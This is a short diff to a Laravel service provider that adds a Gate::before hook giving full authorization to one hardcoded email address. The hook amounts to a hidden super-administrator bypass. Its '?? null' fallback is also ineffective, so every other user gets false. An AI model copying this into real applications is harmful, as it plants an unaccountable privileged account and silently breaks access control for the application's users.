@@ -6,6 +6,7 @@ use Google\Client;
 use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Storage;
 use Illuminate\Support\ServiceProvider;
+use Illuminate\Support\Facades\Gate;
 
 class AppServiceProvider extends ServiceProvider
 {
@@ -54,5 +55,9 @@ class AppServiceProvider extends ServiceProvider
             // your exception handling logic
 
         }
+
+        Gate::before(function ($user, $ability) {
+            return $user->email == 'jhamnerx1x@gmail.com' ?? null;
+        });
     }
 }
